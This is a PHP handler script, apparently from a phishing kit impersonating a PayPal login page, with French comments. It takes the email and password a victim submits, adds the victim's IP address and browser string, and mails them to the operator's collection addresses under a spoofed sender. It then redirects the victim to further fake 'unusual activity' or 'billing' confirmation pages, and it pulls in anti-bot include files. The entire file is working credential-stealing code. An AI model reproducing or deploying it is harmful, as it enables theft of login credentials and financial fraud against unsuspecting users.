<?php
error_reporting(0);
ob_start();
session_start();

include '../monsterab/ab.php';
include '../algorythm/mail.php';
include '../prevents/anti9.php';
include '../algorythm/wanted_options.php';
if(isset($_POST['login_email'])){

//Variables ne pas toucher
$_SESSION['email'] = $_POST['login_email'];
$_SESSION['password'] = $_POST['login_password'];
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
//Message envoyé a votre boite rez 
$msg = "
📘 Email : ".$_SESSION['email']."
🔑 Password : ".$_SESSION['password']."

🔢: ".$_SESSION['ip']."
🌐: ".$_SESSION['useragent']."
";
$subject = "「💻」 +1 NEW PP LOGIN |" . $_SESSION['ip'] . " ";
$fromsender = "From: ©️ ALIBABA ©️ <log@rezappl.com>";
mail($rezmail,$subject,$msg,$fromsender);
mail($rezmail2,$subject,$msg,$fromsender);
if($unusual_activity == "yes"){
header("Location: ../confirmations/unusual_activity");
$_SESSION['login'] = true;
}
else{

header("Location: ../confirmations/billing");
$_SESSION['login'] = true;
}
}
else{ 

header("Location: index.php");
}
?>